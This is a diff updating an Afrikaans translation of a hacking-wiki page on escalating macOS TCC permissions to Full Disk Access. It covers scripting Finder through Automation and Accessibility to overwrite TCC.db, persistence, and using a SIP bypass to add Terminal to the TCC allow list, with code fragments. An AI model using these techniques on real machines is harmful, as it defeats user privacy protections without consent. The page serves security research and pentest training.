@@ -444,11 +620,11 @@ EOD
 touch "$HOME/Desktop/file"
 rm "$HOME/Desktop/file"
 ```
-### Outomatisering (SE) + Toeganklikheid (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** na FDA\*
+### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** om FDA\*
 
-Outomatisering op **`System Events`** + Toeganklikheid (**`kTCCServicePostEvent`**) maak dit moontlik om **toetsdrukke na prosesse** te stuur. Op hierdie manier kan jy Finder misbruik om die gebruikers se TCC.db te verander of om FDA aan 'n arbitrêre app te gee (alhoewel 'n wagwoord dalk hiervoor gevra mag word).
+Automation op **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) laat toe om **keystrokes** na prosesse te stuur. Op hierdie manier kan jy Finder misbruik om die gebruiker se TCC.db te verander of om FDA aan ’n arbitrêre app te gee (hoewel ’n wagwoord moontlik hiervoor gevra kan word).
 
-Finder wat gebruikers se TCC.db oorskryf voorbeeld:
+Voorbeeld van Finder wat die gebruiker se TCC.db oorskryf:
 ```applescript
 -- store the TCC.db file to copy in /tmp
 osascript <<EOF
@@ -494,41 +670,41 @@ keystroke "v" using {command down}
 end tell
 EOF
 ```
-### `kTCCServiceAccessibility` na FDA\*
+### `kTCCServiceAccessibility` tot FDA\*
 
-Kyk hierdie bladsy vir sommige [**payloads om die Toeganklikheid toestemmings te misbruik**](macos-tcc-payloads.md#accessibility) om privesc na FDA\* of om 'n keylogger te loop byvoorbeeld.
+Gaan hierdie bladsy na vir [**payloads om die Accessibility-permissies te misbruik**](macos-tcc-payloads.md#accessibility) om byvoorbeeld tot FDA\* te privesc of 'n keylogger te laat loop.
 
-### **Eindpunt Sekuriteit Kliënt na FDA**
+### **Endpoint Security Client tot FDA**
 
 As jy **`kTCCServiceEndpointSecurityClient`** het, het jy FDA. Einde.
 
-### Stelselsbeleid SysAdmin Lêer na FDA
+### System Policy SysAdmin File tot FDA
 
-**`kTCCServiceSystemPolicySysAdminFiles`** laat toe om die **`NFSHomeDirectory`** attribuut van 'n gebruiker te **verander** wat sy tuisgids verander en dus toelaat om **TCC te omseil**.
+**`kTCCServiceSystemPolicySysAdminFiles`** laat jou toe om die **`NFSHomeDirectory`**-attribuut van 'n gebruiker te **verander**, wat sy tuisgids verander en jou daarom toelaat om **TCC te omseil**.
 
-### Gebruiker TCC DB na FDA
+### User TCC DB tot FDA
 
-Deur **skryftoestemmings** oor die **gebruiker TCC** databasis te verkry kan jy **nie** vir jouself **`FDA`** toestemmings gee nie, slegs diegene wat in die stelseldatabasis woon kan dit toeken.
+As jy **skryftoestemmings** oor die **user TCC**-databasis verkry, **kan** jy nie aan jouself **`FDA`**-toestemmings toestaan nie; slegs die een wat in die system database leef, kan dit toestaan.
 
-Maar jy kan vir jouself **`Outomatisering regte na Finder`** gee, en die vorige tegniek misbruik om na FDA\* te eskaleer.
+Maar jy **kan** aan jouself **`Automation rights to Finder`** gee en die vorige tegniek misbruik om tot FDA\* te eskaleer.
 
-### **FDA na TCC toestemmings**
+### **FDA tot TCC-permissies**
 
-**Volledige Skyf Toegang** is TCC se naam is **`kTCCServiceSystemPolicyAllFiles`**
+Die TCC-naam vir **Full Disk Access** is **`kTCCServiceSystemPolicyAllFiles`**
 
-Ek dink nie dit is 'n werklike privesc nie, maar net ingeval jy dit nuttig vind: As jy 'n program met FDA beheer, kan jy **die gebruikers TCC databasis wysig en vir jouself enige toegang gee**. Dit kan nuttig wees as 'n volhardingstegniek ingeval jy jou FDA toestemmings mag verloor.
+Ek dink nie dit is 'n werklike privesc nie, maar net ingeval jy dit nuttig vind: As jy 'n program met FDA beheer, kan jy die gebruiker se TCC-databasis **wysig en aan jouself enige toegang gee**. Dit kan nuttig wees as 'n persistence-tegniek ingeval jy dalk jou FDA-permissies verloor.
 
-### **SIP Omseiling na TCC Omseiling**
+### **SIP Bypass tot TCC Bypass**
 
-Die stelsel **TCC databasis** is beskerm deur **SIP**, daarom kan slegs prosesse met die **aangegewe regte dit wysig**. Daarom, as 'n aanvaller 'n **SIP omseiling** oor 'n **lêer** vind (in staat om 'n lêer wat deur SIP beperk is te wysig), sal hy in staat wees om:
+Die system **TCC-databasis** word deur **SIP** beskerm; daarom sal slegs prosesse met die **aangeduide entitlements dit kan wysig**. As 'n aanvaller dus 'n **SIP bypass** vir 'n **lêer** vind (in staat wees om 'n lêer te wysig wat deur SIP beperk word), sal hy in staat wees om:
 
-- **Die beskerming** van 'n TCC databasis te verwyder, en vir homself al die TCC toestemmings te gee. Hy kan enige van hierdie lêers misbruik byvoorbeeld:
-- Die TCC stelseldatabasis
+- **Die beskerming** van 'n TCC-databasis te **verwyder** en aan homself alle TCC-permissies te gee. Hy kan byvoorbeeld enige van hierdie lêers misbruik:
+- Die TCC systems database
 - REG.db
 - MDMOverrides.plist
 
-Daar is egter 'n ander opsie om hierdie **SIP omseiling te misbruik om TCC te omseil**, die lêer `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` is 'n toelaat lys van toepassings wat 'n TCC uitsondering vereis. Daarom, as 'n aanvaller die **SIP beskerming** van hierdie lêer kan **verwyder** en sy **eie toepassing** kan byvoeg, sal die toepassing in staat wees om TCC te omseil.\
-Byvoorbeeld om terminal toe te voeg:
+Daar is egter nog 'n opsie om hierdie **SIP bypass te misbruik om TCC te omseil**: die lêer `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` is 'n allow list van toepassings wat 'n TCC-uitsondering vereis. As 'n aanvaller dus die **SIP-beskerming** van hierdie lêer kan **verwyder** en sy **eie toepassing** kan byvoeg, sal die toepassing TCC kan omseil.\
+Byvoorbeeld, om terminal by te voeg:
 ```bash
 # Get needed info
 codesign -d -r- /System/Applications/Utilities/Terminal.app
@@ -556,18 +732,18 @@ AllowApplicationsList.plist:
 </dict>
 </plist>
 ```
-### TCC Bypasses
+### TCC-omseilings
 
 
 {{#ref}}
 macos-tcc-bypasses/
 {{#endref}}
 
-## References
+## Verwysings
 
-- [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
-- [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
-- [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
-- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
+- [1] ['n Diepgaande ondersoek na macOS TCC.db - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
+- [2] [maclTrack.command - script om com.apple.macl na te spoor (Gist deur brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
+- [3] [Spoor com.apple.macl na en pak dit aan](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
+- [4] [Omseiling van macOS TCC-gebruikersprivaatheidsbeskerming per ongeluk en volgens ontwerp](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
 
 {{#include ../../../../banners/hacktricks-training.md}}
